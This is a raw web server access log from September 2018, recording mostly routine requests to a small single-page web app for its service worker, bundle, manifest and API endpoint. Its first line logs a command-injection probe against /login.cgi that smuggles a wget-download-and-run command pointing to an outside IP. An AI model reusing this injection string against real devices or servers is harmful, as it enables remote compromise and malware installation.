188.19.235.83 - - [01/Sep/2018:20:06:15 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://77.73.69.246/dl%20-O%20-%3E%20/tmp/.shinka2;sh%20/tmp/.shinka2%27$ HTTP/1.1" 400 173 "-" "Shinka/2.0" "-"
172.31.23.250 - - [05/Sep/2018:08:22:10 +0000] "GET /service-worker.js HTTP/1.1" 200 654 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:22:10 +0000] "GET /%PUBLIC_URL%/manifest.json HTTP/1.1" 400 173 "-" "-" "-"
172.31.23.250 - - [05/Sep/2018:08:22:10 +0000] "GET /%PUBLIC_URL%/favicon.ico HTTP/1.1" 400 173 "-" "-" "-"
172.31.13.179 - - [05/Sep/2018:08:22:11 +0000] "GET /favicon.ico HTTP/1.1" 200 853 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5 Build/MRA58N) AppleWebKit/537.36(KHTML, like Gecko) Chrome/66.0.3359.30 Mobile Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:22:11 +0000] "GET /service-worker.js HTTP/1.1" 200 654 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.13.179 - - [05/Sep/2018:08:22:12 +0000] "GET /%PUBLIC_URL%/favicon.ico HTTP/1.1" 400 173 "-" "-" "-"
172.31.23.250 - - [05/Sep/2018:08:22:22 +0000] "GET /favicon.ico HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:22:25 +0000] "GET /service-worker.js HTTP/1.1" 200 654 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:22:26 +0000] "GET /api/hello HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/favicon.ico" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.13.179 - - [05/Sep/2018:08:22:26 +0000] "GET /[object%20Object] HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/favicon.ico" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.13.179 - - [05/Sep/2018:08:22:26 +0000] "GET /%PUBLIC_URL%/favicon.ico HTTP/1.1" 400 173 "-" "-" "-"
172.31.23.250 - - [05/Sep/2018:08:26:25 +0000] "GET /favicon.ico HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:26:26 +0000] "GET /api/hello HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/favicon.ico" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:26:26 +0000] "GET /[object%20Object] HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/favicon.ico" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:26:26 +0000] "GET /%PUBLIC_URL%/favicon.ico HTTP/1.1" 400 173 "-" "-" "-"
172.31.23.250 - - [05/Sep/2018:08:26:27 +0000] "GET /service-worker.js HTTP/1.1" 200 654 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:26:35 +0000] "GET /favicon.ico HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:26:35 +0000] "GET /api/hello HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/favicon.ico" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:26:35 +0000] "GET /[object%20Object] HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/favicon.ico" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:26:36 +0000] "GET /%PUBLIC_URL%/favicon.ico HTTP/1.1" 400 173 "-" "-" "-"
172.31.23.250 - - [05/Sep/2018:08:26:37 +0000] "GET /service-worker.js HTTP/1.1" 200 654 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:26:38 +0000] "GET /favicon.ico HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:26:39 +0000] "GET /api/hello HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/favicon.ico" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:26:39 +0000] "GET /[object%20Object] HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/favicon.ico" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:26:39 +0000] "GET /%PUBLIC_URL%/favicon.ico HTTP/1.1" 400 173 "-" "-" "-"
172.31.23.250 - - [05/Sep/2018:08:26:40 +0000] "GET /service-worker.js HTTP/1.1" 200 654 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:26:42 +0000] "GET /favicon.ico HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:26:43 +0000] "GET /api/hello HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/favicon.ico" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:26:43 +0000] "GET /[object%20Object] HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/favicon.ico" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:26:43 +0000] "GET /%PUBLIC_URL%/favicon.ico HTTP/1.1" 400 173 "-" "-" "-"
172.31.23.250 - - [05/Sep/2018:08:26:44 +0000] "GET /service-worker.js HTTP/1.1" 200 654 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:27:10 +0000] "GET /favicon.ico HTTP/1.1" 502 575 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:27:12 +0000] "GET /service-worker.js HTTP/1.1" 200 659 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:27:12 +0000] "GET /precache-manifest.4979e171f5f0966d9856c361c5f79321.js HTTP/1.1" 200 232 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:27:13 +0000] "GET /manifest.fbdb4ac39e68880df733a90c1db0fcd5.json HTTP/1.1" 200 445 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:27:13 +0000] "GET /index.html HTTP/1.1" 200 915 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:27:14 +0000] "GET /favicon.ico HTTP/1.1" 200 3870 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:27:14 +0000] "GET /bundle.js HTTP/1.1" 200 69488 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:27:20 +0000] "GET /favicon.ico HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:27:22 +0000] "GET /service-worker.js HTTP/1.1" 200 659 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:27:27 +0000] "GET /api/hello HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:27:27 +0000] "GET /[object%20Object] HTTP/1.1" 200 915 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:27:27 +0000] "GET /%PUBLIC_URL%/favicon.ico HTTP/1.1" 400 173 "-" "-" "-"
172.31.23.250 - - [05/Sep/2018:08:27:28 +0000] "GET /service-worker.js HTTP/1.1" 200 659 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:27:34 +0000] "GET /api/hello HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:27:34 +0000] "GET /[object%20Object] HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:27:34 +0000] "GET /%PUBLIC_URL%/favicon.ico HTTP/1.1" 400 173 "-" "-" "-"
172.31.23.250 - - [05/Sep/2018:08:27:35 +0000] "GET /service-worker.js HTTP/1.1" 200 659 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:27:42 +0000] "GET /api/hello HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:27:42 +0000] "GET /[object%20Object] HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:27:43 +0000] "GET /%PUBLIC_URL%/favicon.ico HTTP/1.1" 400 173 "-" "-" "-"
172.31.23.250 - - [05/Sep/2018:08:27:44 +0000] "GET /service-worker.js HTTP/1.1" 200 659 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:28:00 +0000] "GET /api/hello HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:28:00 +0000] "GET /[object%20Object] HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:28:00 +0000] "GET /%PUBLIC_URL%/favicon.ico HTTP/1.1" 400 173 "-" "-" "-"
172.31.23.250 - - [05/Sep/2018:08:28:01 +0000] "GET /service-worker.js HTTP/1.1" 200 659 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:28:56 +0000] "GET / HTTP/1.1" 200 915 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:28:56 +0000] "GET /bundle.js HTTP/1.1" 200 69488 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:28:59 +0000] "GET /api/hello HTTP/1.1" 200 58 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:28:59 +0000] "GET /5d5d9eefa31e5e13a6610d9fa7a283bb.svg HTTP/1.1" 200 2671 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:28:59 +0000] "GET /service-worker.js HTTP/1.1" 200 659 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:29:00 +0000] "GET /precache-manifest.4979e171f5f0966d9856c361c5f79321.js HTTP/1.1" 200 232 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:29:01 +0000] "GET /manifest.fbdb4ac39e68880df733a90c1db0fcd5.json HTTP/1.1" 200 445 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:29:01 +0000] "GET /index.html HTTP/1.1" 200 915 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:29:02 +0000] "GET /favicon.ico HTTP/1.1" 200 3870 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:29:02 +0000] "GET /bundle.js HTTP/1.1" 200 69488 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:29:37 +0000] "GET / HTTP/1.1" 200 915 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5 Build/MRA58N) AppleWebKit/537.36(KHTML, like Gecko) Chrome/66.0.3359.30 Mobile Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:29:37 +0000] "GET /bundle.js HTTP/1.1" 200 69488 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5 Build/MRA58N) AppleWebKit/537.36(KHTML, like Gecko) Chrome/66.0.3359.30 Mobile Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:29:38 +0000] "GET /api/hello HTTP/1.1" 200 58 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5 Build/MRA58N) AppleWebKit/537.36(KHTML, like Gecko) Chrome/66.0.3359.30 Mobile Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:29:38 +0000] "GET /5d5d9eefa31e5e13a6610d9fa7a283bb.svg HTTP/1.1" 200 2671 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5 Build/MRA58N) AppleWebKit/537.36(KHTML, like Gecko) Chrome/66.0.3359.30 Mobile Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:29:38 +0000] "GET /service-worker.js HTTP/1.1" 200 659 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:29:39 +0000] "GET /precache-manifest.4979e171f5f0966d9856c361c5f79321.js HTTP/1.1" 200 232 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:29:40 +0000] "GET /manifest.fbdb4ac39e68880df733a90c1db0fcd5.json HTTP/1.1" 200 445 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:29:40 +0000] "GET /index.html HTTP/1.1" 200 915 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:29:40 +0000] "GET /favicon.ico HTTP/1.1" 200 3870 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:29:40 +0000] "GET /bundle.js HTTP/1.1" 200 69488 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:29:44 +0000] "GET /manifest.json HTTP/1.1" 200 915 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5 Build/MRA58N) AppleWebKit/537.36(KHTML, like Gecko) Chrome/66.0.3359.30 Mobile Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:29:46 +0000] "GET /robots.txt HTTP/1.1" 200 915 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5 Build/MRA58N) AppleWebKit/537.36(KHTML, like Gecko) Chrome/66.0.3359.30 Mobile Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:29:48 +0000] "GET /5d5d9eefa31e5e13a6610d9fa7a283bb.svg HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:29:48 +0000] "GET /manifest.json HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5 Build/MRA58N) AppleWebKit/537.36(KHTML, like Gecko) Chrome/66.0.3359.30 Mobile Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:29:49 +0000] "GET / HTTP/1.1" 200 915 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5 Build/MRA58N) AppleWebKit/537.36(KHTML, like Gecko) Chrome/66.0.3359.30 Mobile Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:29:50 +0000] "GET /api/hello HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:29:50 +0000] "GET /[object%20Object] HTTP/1.1" 200 915 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:29:50 +0000] "GET /service-worker.js HTTP/1.1" 200 659 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:29:50 +0000] "GET /service-worker.js HTTP/1.1" 200 659 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:29:50 +0000] "GET /%PUBLIC_URL%/favicon.ico HTTP/1.1" 400 173 "-" "-" "-"
172.31.23.250 - - [05/Sep/2018:08:29:50 +0000] "GET /precache-manifest.4979e171f5f0966d9856c361c5f79321.js HTTP/1.1" 200 232 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:29:51 +0000] "GET /manifest.fbdb4ac39e68880df733a90c1db0fcd5.json HTTP/1.1" 200 445 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:29:51 +0000] "GET /favicon.ico HTTP/1.1" 200 3870 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:29:51 +0000] "GET /index.html HTTP/1.1" 200 915 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "177.134.78.59"
